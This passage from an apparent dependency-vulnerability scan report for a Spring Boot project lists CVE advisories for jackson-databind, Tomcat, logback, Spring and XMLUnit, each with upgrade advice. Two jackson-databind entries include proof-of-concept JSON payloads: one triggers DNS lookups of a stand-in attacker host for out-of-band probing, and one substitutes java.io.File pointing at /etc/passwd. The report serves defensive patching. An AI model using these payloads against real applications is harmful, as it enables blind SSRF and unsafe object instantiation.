Verified against the FIXED released artifact (jackson-databind 2.18.8, from Maven Central): decompiled bytecode shows the InetSocketAddress branch now routes through `_inetSocketAddress -> createUnresolved`, while `InetAddress.getByName` is still emitted unchanged in the InetAddress branch.

### PoC
Lab-only, zero network egress. Run against the fixed jackson-databind 2.18.8.

A custom JDK InetAddressResolver SPI (Java 18+) counts forward lookups locally and answers with loopback, so no traffic leaves the host:

    ObjectMapper m = new ObjectMapper();
    // InetSocketAddress (patched): 0 resolver lookups, isUnresolved=true
    m.readValue("\"internal-metadata.attacker-oob.example:8080\"", InetSocketAddress.class);
    // InetAddress (unpatched sibling): 1 resolver lookup on the attacker host
    m.readValue("\"internal-metadata.attacker-oob.example\"", InetAddress.class);

Observed output (jackson 2.18.8):
    [A] InetSocketAddress  isUnresolved=true  resolverLookups=0  lastHost=null
    [B] InetAddress        value=localhost/127.0.0.1  resolverLookups=1  lastHost=internal-metadata.attacker-oob.example

A standalone variant (no SPI) using an RFC-6761 `.invalid` canary host shows the same: deserializing into InetAddress raises UnknownHostException (the OS resolver was invoked), while InetSocketAddress stays unresolved. Full source in PocResolverCount.java and PocInetAddressIncompleteFix.java.

Reachability with a plain field (no annotations, no polymorphism, no default typing):
    static class Config { public InetAddress bindHost; public int port; }
    mapper.readValue("{\"bindHost\":\"poc-reach.example\",\"port\":1}", Config.class);
    // -> resolver invoked on "poc-reach.example"

### Impact
An attacker who can influence JSON deserialized into an `InetAddress` target can force the application to perform outbound forward DNS lookups for attacker-chosen hostnames at deserialization time, before any application-level validation. This yields a DNS-based SSRF / OOB primitive: out-of-band exfiltration / interaction via DNS callbacks, and blind probing of whether internal hostnames resolve (internal-host enumeration). This is the same impact class and trust boundary for which CVE-2026-54514 (CVSS 5.3, CWE-918) was assigned to the InetSocketAddress branch. It is a DNS-lookup / blind SSRF primitive, not arbitrary HTTP SSRF or RCE; it does not itself open a socket.

Suggested fix: avoid eager resolution for InetAddress as well — e.g. defer resolution, validate the host string before resolving, or provide an opt-in/opt-out consistent with the InetSocketAddress fix (there is no direct unresolved-InetAddress equivalent, so deferring/validating or documenting the resolution is the practical mitigation).

Credit : Ta Duc Thien

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - com.fasterxml.jackson.core:jackson-databind:2.13.5; affected range: >= 2.0.0, < 2.18.9
    - Transitive; pulled by direct root declared at pom.xml:76; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-json:2.7.18 -> com.fasterxml.jackson.core:jackson-databind:2.13.5

Recommended fix:
  - com.fasterxml.jackson.core:jackson-databind: upgrade to 2.18.9 or a compatible unaffected release; verify the range and release branch; update the direct root/BOM when transitive.

### CVE-2026-83557: jackson-databind: Comparable missing from DefaultBaseTypeLimitingValidator's unsafe base types (incomplete PolymorphicTypeValidator denylist)
- **Category:** CVE
- **Severity:** optional
- **Story Points:** 1
- **Files:** pom.xml:76

[CVE-2026-83557](https://github.com/advisories/GHSA-gx83-3vf8-gh7j): jackson-databind: Comparable missing from DefaultBaseTypeLimitingValidator's unsafe base types (incomplete PolymorphicTypeValidator denylist)

GHSA: GHSA-gx83-3vf8-gh7j
Severity: MEDIUM

### Summary
`DefaultBaseTypeLimitingValidator` — the `PolymorphicTypeValidator` used automatically whenever `@JsonTypeInfo` is applied without an explicitly configured custom validator — denies polymorphic resolution only for nine specific "unsafe base types" (`Object`, `Serializable`, `Closeable`, `AutoCloseable`, `Cloneable`, `Runnable`, `java.util.logging.Handler`, `javax.naming.Referenceable`, `javax.sql.DataSource`). Its `isSafeSubType()` returns `true` unconditionally for every other base type. `java.lang.Comparable` is not in that list, despite being implemented by a very large fraction of JDK and application classes — comparable in breadth to `Serializable`, which is denylisted for exactly that reason. An application with an `@JsonTypeInfo`-annotated `Comparable`-typed property, and no custom validator configured, will accept a type identifier for essentially any class implementing `Comparable`.

### Details
**Affected file:** `src/main/java/tools/jackson/databind/jsontype/DefaultBaseTypeLimitingValidator.java`

```java
private final static class UnsafeBaseTypes {
    private final Set<String> UNSAFE = new HashSet<>();
    {
        UNSAFE.add(Object.class.getName());
        UNSAFE.add(java.io.Closeable.class.getName());
        UNSAFE.add(java.io.Serializable.class.getName());
        UNSAFE.add(AutoCloseable.class.getName());
        UNSAFE.add(Cloneable.class.getName());
        UNSAFE.add(Runnable.class.getName());          // [databind#5014]
        UNSAFE.add("java.util.logging.Handler");
        UNSAFE.add("javax.naming.Referenceable");
        UNSAFE.add("javax.sql.DataSource");
        // java.lang.Comparable is NOT present here
    }
}

protected boolean isSafeSubType(DatabindContext ctxt,
        JavaType baseType, JavaType subType) {
    return true;   // unconditional for every base type not in UNSAFE
}
```

The class's own JavaDoc acknowledges the design (*"Note that when using potentially unsafe base type like `java.lang.Object` a custom implementation... is needed"*), so the trade-off of leaving broad base types unrestricted is intentional. The gap is that `Comparable` has the same breadth of implementers as the types this class *does* restrict, and its absence looks like an oversight rather than a deliberate choice — consistent with the ongoing, incremental nature of this list (`Runnable` was added recently for issue #5014).

This is specific to the **default, unconfigured validator** reached via bare `@JsonTypeInfo` usage. Global "Default Typing" via `activateDefaultTyping()` is **not** affected, because that method structurally requires an explicit `PolymorphicTypeValidator` argument — a correctly-configured `BasicPolymorphicTypeValidator` rejects the same payload under `activateDefaultTyping()`.

### PoC
Built entirely from source (jackson-databind + jackson-core + jackson-annotations, `javac`, OpenJDK 21, no third-party gadget libraries, no network access):

**1. Sanity check (benign class, confirms the mechanism fires):**
```java
static class SafeThing implements Comparable<SafeThing> {
    public String name;
    public SafeThing() {}
    public int compareTo(SafeThing o) { return 0; }
}
static class Holder {
    @JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)
    public Comparable<?> value;
}

ObjectMapper mapper = JsonMapper.builder().build();   // no custom PTV
String json = "{\"value\":{\"@class\":\"...SafeThing\",\"name\":\"hello\"}}";
Holder h = mapper.readValue(json, Holder.class);
// RESULT: ACCEPTED, class=...SafeThing
```

**2. Real JDK class substitution:**
```java
String json = "{\"value\":[\"java.io.File\",\"/etc/passwd\"]}";
Holder h = mapper.readValue(json, Holder.class);
// RESULT: ACCEPTED, class=java.io.File value=/etc/passwd
```

**3. Negative control — Default Typing with an explicit custom PTV:**
```java
PolymorphicTypeValidator ptv = BasicPolymorphicTypeValidator.builder()
    .allowIfSubType("PtvGapTest4").build();
ObjectMapper mapper = JsonMapper.builder()
    .activateDefaultTyping(ptv, DefaultTyping.NON_FINAL).build();
// same java.io.File payload
// RESULT: REJECTED - InvalidTypeIdException: "...denied resolution"
```

**Observed output:**




$ java -cp .:build/classes PtvGapTest3
Trying: {"value":["java.io.File","/etc/passwd"]}
ACCEPTED, class=java.io.File value=/etc/passwd

$ java -cp .:build/classes PtvGapTest4
Trying malicious substitution: ["PtvGapTest4$Holder",{"value":["java.io.File","/etc/passwd"]}]
REJECTED - InvalidTypeIdException: Could not resolve type id 'java.io.File' as a
subtype of java.lang.Comparable: Configured PolymorphicTypeValidator denied resolution




### Impact
Any application declaring an `@JsonTypeInfo`-annotated property or class with `Comparable` as its base type, without a separately configured restrictive `PolymorphicTypeValidator`, will accept a type identifier for essentially any class implementing `Comparable`. Concrete impact is demonstrated via `java.io.File`: an attacker can cause construction of a `File` object for an arbitrary, attacker-chosen path. On its own this is a controlled-object-instantiation primitive; if the application later calls path-sensitive or mutating methods on the received value, this becomes a path-traversal-adjacent primitive. 

**Suggested remediation:**
1. Add `java.lang.Comparable` to `UnsafeBaseTypes.UNSAFE`.
2. Audit other broad JDK interfaces (`java.lang.Iterable`, `java.util.EventListener`) for the same gap.
3. Consider a narrower default for `isSafeSubType()` for base types outside the fixed denylist, rather than unconditional `true`.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - com.fasterxml.jackson.core:jackson-databind:2.13.5; affected range: >= 2.11.0, < 2.18.10
    - Transitive; pulled by direct root declared at pom.xml:76; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-json:2.7.18 -> com.fasterxml.jackson.core:jackson-databind:2.13.5

Recommended fix:
  - com.fasterxml.jackson.core:jackson-databind: upgrade to 2.18.10 or a compatible unaffected release; verify the range and release branch; update the direct root/BOM when transitive.

### CVE-2024-12801: QOS.CH logback-core Server-Side Request Forgery vulnerability
- **Category:** CVE
- **Severity:** potential
- **Story Points:** 1
- **Files:** pom.xml:32

[CVE-2024-12801](https://github.com/advisories/GHSA-6v67-2wr5-gvf4): QOS.CH logback-core Server-Side Request Forgery vulnerability

GHSA: GHSA-6v67-2wr5-gvf4
Severity: LOW

Server-Side Request Forgery (SSRF) in SaxEventRecorder by QOS.CH logback version 1.5.12 on the Java platform, allows an attacker to forge requests by compromising logback configuration files in XML.
 
The attacks involves the modification of DOCTYPE declaration in  XML configuration files.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - ch.qos.logback:logback-core:1.2.12; affected range: < 1.3.15
    - Transitive; pulled by direct root declared at pom.xml:32; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-web:2.7.18 -> org.springframework.boot:spring-boot-starter:2.7.18 -> org.springframework.boot:spring-boot-starter-logging:2.7.18 -> ch.qos.logback:logback-classic:1.2.12 -> ch.qos.logback:logback-core:1.2.12

Recommended fix:
  - ch.qos.logback:logback-core: upgrade to 1.3.15 or a compatible unaffected release; verify the range and release branch; update the direct root/BOM when transitive.

### CVE-2024-31573: XMLUnit for Java has Insecure Defaults when Processing XSLT Stylesheets
- **Category:** CVE
- **Severity:** potential
- **Story Points:** 1
- **Files:** pom.xml:82

[CVE-2024-31573](https://github.com/advisories/GHSA-chfm-68vv-pvw5): XMLUnit for Java has Insecure Defaults when Processing XSLT Stylesheets

GHSA: GHSA-chfm-68vv-pvw5
Severity: LOW

### Impact
When performing XSLT transformations XMLUnit for Java did not disable XSLT extension functions by default. Depending on the XSLT processor being used this could allow arbitrary code to be executed when XMLUnit is used to transform data with a stylesheet who's source can not be trusted. If the stylesheet can be provided externally this may even lead to a remote code execution.

## Patches
Users are advised to upgrade to XMLUnit for Java 2.10.0 where the default has been changed by means of https://github.com/xmlunit/xmlunit/commit/b81d48b71dfd2868bdfc30a3e17ff973f32bc15b

### Workarounds
XMLUnit's main use-case is performing tests on code that generates or processes XML. Most users will not use it to perform arbitrary XSLT transformations.

Users running XSLT transformations with untrusted stylesheets should explicitly use XMLUnit's APIs to pass in a pre-configured TraX `TransformerFactory` with extension functions disabled via features and attributes. The required `setFactory` or `setTransformerFactory` methods have been available since XMLUnit for Java 2.0.0.

### References
[Bug Report](https://github.com/xmlunit/xmlunit/issues/264)
[JAXP Security Guide](https://docs.oracle.com/en/java/javase/22/security/java-api-xml-processing-jaxp-security-guide.html#GUID-E345AA09-801E-4B95-B83D-7F0C452538AA)


Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.xmlunit:xmlunit-core:2.9.1; affected range: < 2.10.0
    - Transitive; pulled by direct root declared at pom.xml:82; scope: test; full resolved chain: org.springframework.boot:spring-boot-starter-test:2.7.18 -> org.xmlunit:xmlunit-core:2.9.1

Recommended fix:
  - org.xmlunit:xmlunit-core: upgrade to 2.10.0 or a compatible unaffected release; verify the range and release branch; update the direct root/BOM when transitive.

### CVE-2025-22233: Spring Framework DataBinder Case Sensitive Match Exception
- **Category:** CVE
- **Severity:** potential
- **Story Points:** 1
- **Files:** pom.xml:32

[CVE-2025-22233](https://github.com/advisories/GHSA-4wp7-92pw-q264): Spring Framework DataBinder Case Sensitive Match Exception

GHSA: GHSA-4wp7-92pw-q264
Severity: LOW

CVE-2024-38820 ensured Locale-independent, lowercase conversion for both the configured disallowedFields patterns and for request parameter names. However, there are still cases where it is possible to bypass the disallowedFields checks.

Affected Spring Products and Versions

Spring Framework:
  *  6.2.0 - 6.2.6

  *  6.1.0 - 6.1.19

  *  6.0.0 - 6.0.27

  *  5.3.0 - 5.3.42
  *  Older, unsupported versions are also affected



Mitigation

Users of affected versions should upgrade to the corresponding fixed version.

| Affected version(s) | Fix Version | Availability |
| - | - | - |
| 6.2.x |  6.2.7 | OSS |
| 6.1.x |  6.1.20 | OSS |
| 6.0.x |  6.0.28 |  Commercial https://enterprise.spring.io/ |
| 5.3.x |  5.3.43 | Commercial https://enterprise.spring.io/  |

No further mitigation steps are necessary.


Generally, we recommend using a dedicated model object with properties only for data binding, or using constructor binding since constructor arguments explicitly declare what to bind together with turning off setter binding through the declarativeBinding flag. See the Model Design section in the reference documentation.

For setting binding, prefer the use of allowedFields (an explicit list) over disallowedFields.

Credit

This issue was responsibly reported by the TERASOLUNA Framework Development Team from NTT DATA Group Corporation.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.springframework:spring-context:5.3.31; affected range: <= 5.3.39
    - Transitive; pulled by direct root declared at pom.xml:32; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-web:2.7.18 -> org.springframework:spring-webmvc:5.3.31 -> org.springframework:spring-context:5.3.31

Recommended fix:
  - org.springframework:spring-context: no first patched version provided; consult the advisory for mitigation or an unaffected supported release.

### CVE-2025-31651: Apache Tomcat Rewrite rule bypass
- **Category:** CVE
- **Severity:** potential
- **Story Points:** 1
- **Files:** pom.xml:32

[CVE-2025-31651](https://github.com/advisories/GHSA-ff77-26x5-69cr): Apache Tomcat Rewrite rule bypass

GHSA: GHSA-ff77-26x5-69cr
Severity: LOW

Improper Neutralization of Escape, Meta, or Control Sequences vulnerability in Apache Tomcat. For a subset of unlikely rewrite rule configurations, it was possible for a specially crafted request to bypass some rewrite rules. If those rewrite rules effectively enforced security constraints, those constraints could be bypassed.

This issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.5, from 10.1.0-M1 through 10.1.39, from 9.0.0.M1 through 9.0.102. The following versions were EOL at the time the CVE was created but are known to be affected: 8.5.0 though 8.5.100. Other, older, EOL versions may also be affected.

Users are recommended to upgrade to version 9.0.104, 10.1.40 or 11.0.6, which fix the issue.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.apache.tomcat.embed:tomcat-embed-core:9.0.83; affected range: >= 9.0.76, <= 9.0.102
    - Transitive; pulled by direct root declared at pom.xml:32; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-web:2.7.18 -> org.springframework.boot:spring-boot-starter-tomcat:2.7.18 -> org.apache.tomcat.embed:tomcat-embed-core:9.0.83

Recommended fix:
  - org.apache.tomcat.embed:tomcat-embed-core: upgrade to 9.0.104 or a compatible unaffected release; verify the range and release branch; update the direct root/BOM when transitive.

### CVE-2025-46701: Apache Tomcat - CGI security constraint bypass
- **Category:** CVE
- **Severity:** potential
- **Story Points:** 1
- **Files:** pom.xml:32

[CVE-2025-46701](https://github.com/advisories/GHSA-h2fw-rfh5-95r3): Apache Tomcat - CGI security constraint bypass

GHSA: GHSA-h2fw-rfh5-95r3
Severity: LOW

Improper Handling of Case Sensitivity vulnerability in Apache Tomcat's GCI servlet allows security constraint bypass of security constraints that apply to the pathInfo component of a URI mapped to the CGI servlet.

This issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.6, from 10.1.0-M1 through 10.1.40, from 9.0.0.M1 through 9.0.104. The following versions were EOL at the time the CVE was created but are known to be affected: 8.5.0 though 8.5.100. Other, older, EOL versions may also be affected.

Users are recommended to upgrade to version 11.0.7, 10.1.41 or 9.0.105, which fixes the issue.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.apache.tomcat.embed:tomcat-embed-core:9.0.83; affected range: >= 9.0.0.M1, < 9.0.105
    - Transitive; pulled by direct root declared at pom.xml:32; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-web:2.7.18 -> org.springframework.boot:spring-boot-starter-tomcat:2.7.18 -> org.apache.tomcat.embed:tomcat-embed-core:9.0.83

Recommended fix:
  - org.apache.tomcat.embed:tomcat-embed-core: upgrade to 9.0.105 or a compatible unaffected release; verify the range and release branch; update the direct root/BOM when transitive.

### CVE-2025-55754: Apache Tomcat Vulnerable to Improper Neutralization of Escape, Meta, or Control Sequences
- **Category:** CVE
- **Severity:** potential
- **Story Points:** 1
- **Files:** pom.xml:32

[CVE-2025-55754](https://github.com/advisories/GHSA-vfww-5hm6-hx2j): Apache Tomcat Vulnerable to Improper Neutralization of Escape, Meta, or Control Sequences

GHSA: GHSA-vfww-5hm6-hx2j
Severity: LOW

Tomcat did not escape ANSI escape sequences in log messages. If Tomcat was running in a console on a Windows operating system, and the console supported ANSI escape sequences, it was possible for an attacker to use a specially crafted URL to inject ANSI escape sequences to manipulate the console and the clipboard and attempt to trick an administrator into running an attacker controlled command. While no attack vector was found, it may have been possible to mount this attack on other operating systems.



This issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.10, from 10.1.0-M1 through 10.1.44, from 9.0.40 through 9.0.108.

The following versions were EOL at the time the CVE was created but are 
known to be affected: 8.5.60 though 8.5.100. Other, older, EOL versions may also be affected.
Users are recommended to upgrade to version 11.0.11 or later, 10.1.45 or later or 9.0.109 or later, which fix the issue.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.apache.tomcat.embed:tomcat-embed-core:9.0.83; affected range: >= 9.0.40, < 9.0.109
    - Transitive; pulled by direct root declared at pom.xml:32; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-web:2.7.18 -> org.springframework.boot:spring-boot-starter-tomcat:2.7.18 -> org.apache.tomcat.embed:tomcat-embed-core:9.0.83

Recommended fix:
  - org.apache.tomcat.embed:tomcat-embed-core: upgrade to 9.0.109 or a compatible unaffected release; verify the range and release branch; update the direct root/BOM when transitive.

### CVE-2025-61795: Apache Tomcat Vulnerable to Improper Resource Shutdown or Release
- **Category:** CVE
- **Severity:** potential
- **Story Points:** 1
- **Files:** pom.xml:32

[CVE-2025-61795](https://github.com/advisories/GHSA-hgrr-935x-pq79): Apache Tomcat Vulnerable to Improper Resource Shutdown or Release

GHSA: GHSA-hgrr-935x-pq79
Severity: LOW

If an error occurred (including exceeding limits) during the processing of a multipart upload, temporary copies of the uploaded parts written to disc were not cleaned up immediately but left for the garbage collection process to delete. Depending on JVM settings, application memory usage and application load, it was possible that space for the temporary copies of uploaded parts would be filled faster than GC cleared it, leading to a DoS.

This issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.11, from 10.1.0-M1 through 10.1.46, from 9.0.0.M1 through 9.0.109.

The following versions were EOL at the time the CVE was created but are 
known to be affected: 8.5.0 though 8.5.100. Other, older, EOL versions may also be affected.
Users are recommended to upgrade to version 11.0.12 or later, 10.1.47 or later or 9.0.110 or later which fixes the issue.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.apache.tomcat.embed:tomcat-embed-core:9.0.83; affected range: >= 9.0.0.M1, < 9.0.110
    - Transitive; pulled by direct root declared at pom.xml:32; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-web:2.7.18 -> org.springframework.boot:spring-boot-starter-tomcat:2.7.18 -> org.apache.tomcat.embed:tomcat-embed-core:9.0.83

Recommended fix:
  - org.apache.tomcat.embed:tomcat-embed-core: upgrade to 9.0.110 or a compatible unaffected release; verify the range and release branch; update the direct root/BOM when transitive.

### CVE-2026-10532: Logback vulnerable to Object Injection through HardenedObjectInputStream modules
- **Category:** CVE
- **Severity:** potential
- **Story Points:** 1
- **Files:** pom.xml:32

[CVE-2026-10532](https://github.com/advisories/GHSA-jhq6-gfmj-v8fx): Logback vulnerable to Object Injection through HardenedObjectInputStream modules

GHSA: GHSA-jhq6-gfmj-v8fx
Severity: LOW

Deserialization of untrusted data vulnerability in QOS.CH Sarl logback logback-core (HardenedObjectInputStream (logback-core) modules) allows Object Injection, albeit heavily restricted.

More precisely, an attacker able to influence serialized data sent to SimpleSocketServer or SimpleSSLSocketServer can instantiate Proxy objects.


Although deserialization is heavily restricted by HardenedObjectInputStream and no practical way to achieve remote code execution or significant privilege  escalation has been identified, this issue constitutes a bypass of the  intended security restrictions.



This issue affects logback: through 1.5.33 inclusive.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - ch.qos.logback:logback-core:1.2.12; affected range: < 1.5.34
    - Transitive; pulled by direct root declared at pom.xml:32; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-web:2.7.18 -> org.springframework.boot:spring-boot-starter:2.7.18 -> org.springframework.boot:spring-boot-starter-logging:2.7.18 -> ch.qos.logback:logback-classic:1.2.12 -> ch.qos.logback:logback-core:1.2.12

Recommended fix:
  - ch.qos.logback:logback-core: upgrade to 1.5.34 or a compatible unaffected release; verify the range and release branch; update the direct root/BOM when transitive.

### CVE-2026-1225: Logback allows an attacker to instantiate classes already present on the class path
- **Category:** CVE
- **Severity:** potential
- **Story Points:** 1
- **Files:** pom.xml:32

[CVE-2026-1225](https://github.com/advisories/GHSA-qqpg-mvqg-649v): Logback allows an attacker to instantiate classes already present on the class path

GHSA: GHSA-qqpg-mvqg-649v
Severity: LOW

ACE vulnerability in configuration file processing  by QOS.CH logback-core up to and including version 1.5.24 in Java applications, allows an attacker to instantiate classes already present on the class path by compromising an existing logback configuration file.

The instantiation of a potentially malicious Java class requires that said class is present on the user's class-path. In addition, the attacker must  have write access to a configuration file. However, after successful instantiation, the instance is very likely to be discarded with no further ado.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - ch.qos.logback:logback-core:1.2.12; affected range: < 1.5.25
    - Transitive; pulled by direct root declared at pom.xml:32; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-web:2.7.18 -> org.springframework.boot:spring-boot-starter:2.7.18 -> org.springframework.boot:spring-boot-starter-logging:2.7.18 -> ch.qos.logback:logback-classic:1.2.12 -> ch.qos.logback:logback-core:1.2.12

Recommended fix:
  - ch.qos.logback:logback-core: upgrade to 1.5.25 or a compatible unaffected release; verify the range and release branch; update the direct root/BOM when transitive.

### CVE-2026-22735: Spring MVC and WebFlux has Server Sent Event stream corruption
- **Category:** CVE
- **Severity:** potential
- **Story Points:** 1
- **Files:** pom.xml:32

[CVE-2026-22735](https://github.com/advisories/GHSA-6hcq-hmm3-jj3c): Spring MVC and WebFlux has Server Sent Event stream corruption

GHSA: GHSA-6hcq-hmm3-jj3c
Severity: LOW

Spring MVC and WebFlux applications are vulnerable to stream corruption when using Server-Sent Events (SSE). This issue affects Spring Foundation: from 7.0.0 through 7.0.5, from 6.2.0 through 6.2.16, from 6.1.0 through 6.1.25, from 5.3.0 through 5.3.46.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.springframework:spring-webmvc:5.3.31; affected range: >= 5.3.0, <= 5.3.39
    - Transitive; pulled by direct root declared at pom.xml:32; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-web:2.7.18 -> org.springframework:spring-webmvc:5.3.31

Recommended fix:
  - org.springframework:spring-webmvc: no first patched version provided; consult the advisory for mitigation or an unaffected supported release.

### CVE-2026-22741: Spring MVC and WebFlux applications are vulnerable to cache poisoning when resolving static resources.
- **Category:** CVE
- **Severity:** potential
- **Story Points:** 1
- **Files:** pom.xml:32

[CVE-2026-22741](https://github.com/advisories/GHSA-wg35-8jpf-2xv3): Spring MVC and WebFlux applications are vulnerable to cache poisoning when resolving static resources.

GHSA: GHSA-wg35-8jpf-2xv3
Severity: LOW

Spring MVC and WebFlux applications are vulnerable to cache poisoning when resolving static resources.


More precisely, an application can be vulnerable when all the following are true:

  *  the application is using Spring MVC or Spring WebFlux
  *  the application is configuring the  resource chain support https://docs.spring.io/spring-framework/reference/web/webmvc/mvc-config/static-resources.html#page-title  with caching enabled
  *  the application adds support for encoded resources resolution
  *  the resource cache must be empty when the attacker has access to the application


When all the conditions above are met, the attacker can send malicious requests and poison the resource cache with resources using the wrong encoding. This can cause a denial of service by breaking the front-end application for clients.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.springframework:spring-webmvc:5.3.31; affected range: <= 5.3.47
    - Transitive; pulled by direct root declared at pom.xml:32; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-web:2.7.18 -> org.springframework:spring-webmvc:5.3.31

Recommended fix:
  - org.springframework:spring-webmvc: no first patched version provided; consult the advisory for mitigation or an unaffected supported release.

### CVE-2026-22746: Spring Security Vulnerable to User Attribute Enumeration when Using DaoAuthenticationProvider
- **Category:** CVE
- **Severity:** potential
- **Story Points:** 1
- **Files:** pom.xml:63

[CVE-2026-22746](https://github.com/advisories/GHSA-vxf7-qj7q-83fh): Spring Security Vulnerable to User Attribute Enumeration when Using DaoAuthenticationProvider

GHSA: GHSA-vxf7-qj7q-83fh
Severity: LOW

Vulnerability in Spring Spring Security. If an application is using the UserDetails#isEnabled, #isAccountNonExpired, or #isAccountNonLocked user attributes, to enable, expire, or lock users, then DaoAuthenticationProvider's timing attack defense can be bypassed for users who are disabled, expired, or locked. This issue affects Spring Security: from 5.7.0 through 5.7.22, from 5.8.0 through 5.8.24, from 6.3.0 through 6.3.15, from 6.5.0 through 6.5.9, from 7.0.0 through 7.0.4.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.springframework.security:spring-security-core:5.7.11; affected range: >= 5.7.0, <= 5.7.22
    - Transitive; pulled by direct root declared at pom.xml:63; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-security:2.7.18 -> org.springframework.security:spring-security-config:5.7.11 -> org.springframework.security:spring-security-core:5.7.11

Recommended fix:
  - org.springframework.security:spring-security-core: no first patched version provided; consult the advisory for mitigation or an unaffected supported release.

### CVE-2026-41848: Spring Framework Denial of Service via AntPathMatcher
- **Category:** CVE
- **Severity:** potential
- **Story Points:** 1
- **Files:** pom.xml:82

[CVE-2026-41848](https://github.com/advisories/GHSA-659m-px2c-25wj): Spring Framework Denial of Service via AntPathMatcher

GHSA: GHSA-659m-px2c-25wj
Severity: LOW

Applications may be vulnerable to a Regular Expression Denial of Service (ReDoS) attack if an attacker is able to provide a pattern which is then directly or indirectly supplied to one of the following methods in AntPathMatcher: match(String pattern, String path), matchStart(String pattern, String path), extractUriTemplateVariables(String pattern, String path).

Affected versions:
Spring Framework 7.0.0 through 7.0.7; 6.2.0 through 6.2.18; 6.1.0 through 6.1.27; 5.3.0 through 5.3.48.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.springframework:spring-core:5.3.31; affected range: <= 5.3.39
    - Transitive; pulled by direct root declared at pom.xml:82; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-test:2.7.18 -> org.springframework:spring-core:5.3.31

Recommended fix:
  - org.springframework:spring-core: no first patched version provided; consult the advisory for mitigation or an unaffected supported release.

### CVE-2026-41852: Spring Framework Arbitrary Method Invocation in SpEL Expressions
- **Category:** CVE
- **Severity:** potential
- **Story Points:** 1
- **Files:** pom.xml:32

[CVE-2026-41852](https://github.com/advisories/GHSA-9f52-rjqv-25qv): Spring Framework Arbitrary Method Invocation in SpEL Expressions

GHSA: GHSA-9f52-rjqv-25qv
Severity: LOW

A vulnerability in Spring Expression Language (SpEL) evaluation logic allows for arbitrary zero-argument method invocation, even within restricted or read-only contexts, which may allow an attacker to invoke unintended application logic.

Affected versions:
Spring Framework 7.0.0 through 7.0.7; 6.2.0 through 6.2.18; 6.1.0 through 6.1.27; 5.3.0 through 5.3.48.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.springframework:spring-expression:5.3.31; affected range: <= 5.3.39
    - Transitive; pulled by direct root declared at pom.xml:32; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-web:2.7.18 -> org.springframework:spring-webmvc:5.3.31 -> org.springframework:spring-expression:5.3.31

Recommended fix:
  - org.springframework:spring-expression: no first patched version provided; consult the advisory for mitigation or an unaffected supported release.

### CVE-2026-43514: Apache Tomcat - AJP secret compared in non-constant time
- **Category:** CVE
- **Severity:** potential
- **Story Points:** 1
- **Files:** pom.xml:32

[CVE-2026-43514](https://github.com/advisories/GHSA-9m89-8frq-c98c): Apache Tomcat - AJP secret compared in non-constant time

GHSA: GHSA-9m89-8frq-c98c
Severity: LOW

Versions Affected:
Apache Tomcat 11.0.0-M1 to 11.0.21
Apache Tomcat 10.1.0-M1 to 10.1.54
Apache Tomcat 9.0.0.M1 to 9.0.117
Older, unsupported versions may also be affected

Description:
The AJP secret was compared in non-constant time allowing an attacker on
the local network to mount a timing attack to determine the AJP secret.

Mitigation:
Users of the affected versions should apply one of the following
mitigations:
- Upgrade to Apache Tomcat 11.0.22 or later
- Upgrade to Apache Tomcat 10.1.55 or later
- Upgrade to Apache Tomcat 9.0.118 or later

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.apache.tomcat.embed:tomcat-embed-core:9.0.83; affected range: < 9.0.118
    - Transitive; pulled by direct root declared at pom.xml:32; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-web:2.7.18 -> org.springframework.boot:spring-boot-starter-tomcat:2.7.18 -> org.apache.tomcat.embed:tomcat-embed-core:9.0.83

Recommended fix:
  - org.apache.tomcat.embed:tomcat-embed-core: upgrade to 9.0.118 or a compatible unaffected release; verify the range and release branch; update the direct root/BOM when transitive.

### CVE-2026-9828: QOS.CH Sarl logback logback-core has a deserialization of untrusted data vulnerability
- **Category:** CVE
- **Severity:** potential
- **Story Points:** 1
- **Files:** pom.xml:32

[CVE-2026-9828](https://github.com/advisories/GHSA-p47f-322f-whfh): QOS.CH Sarl logback logback-core has a deserialization of untrusted data vulnerability

GHSA: GHSA-p47f-322f-whfh
Severity: LOW

Deserialization of untrusted data vulnerability in QOS.CH Sarl logback logback-core (HardenedObjectInputStream (logback-core) modules) allows Object Injection albeit heavily restricted.

